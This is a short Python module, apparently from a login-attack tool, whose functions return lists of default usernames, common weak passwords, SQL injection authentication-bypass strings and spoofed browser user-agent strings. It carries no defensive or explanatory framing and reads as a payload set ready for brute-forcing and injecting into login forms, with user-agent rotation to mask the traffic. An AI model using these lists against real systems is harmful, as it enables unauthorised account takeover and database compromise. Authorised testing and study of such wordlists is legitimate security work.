def getUser():
	return """admin
	administrator
	root
	user
	username
	test
	demo""".replace("\t", "")
	
def getPass():
	return """123456a
	123456a@
	1234
	12345
	admin!@#
	123456
	1234567
	12345678
	123456789
	1234567890
	123456789!@#
	123456!@#$%^
	password
	admin
	administrator
	abc123
	abcd1234
	qwerty
	login
	123123
	user
	username
	passw0rd
	12341234
	password1
	654321
	121212
	11112222
	66668888
	00000000
	123qwe
	112233
	1111
	11111111
	555555
	pass
	987654321
	secret
	222222
	88888888
	q1w2e3r4t5
	123123123
	qwer1234
	xxxxxx
	123654
	987654
	q1w2e3r4
	123abc
	qwerty123
	123456q
	12345a
	1122334411223344
	P4ssw0rd""".replace("\t", "")
	
def getSQL():
	return """ or true --
	 or '1'='1' --
	 or '1'='1 --
	' or true --
	' or '1'='1' --
	' or '1'='1 --
	" or true --
	" or '1'='1' --
	" or '1'='1 --
	') or true --
	') or '1'='1' --
	') or '1'='1 --
	") or true --
	") or '1'='1' --
	") or '1'='1 --
	')) or true --
	')) or '1'='1' --
	')) or '1'='1 --
	")) or true --
	")) or '1'='1' --
	")) or '1'='1 --""".replace("\t", "")
	
def getAgent():
	return """Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20060127 Netscape/8.1
	Mozilla/5.0 (iPad; U; CPU OS 3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10
	Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25
	Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
	Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
	Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
	Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124""".replace("\t", "")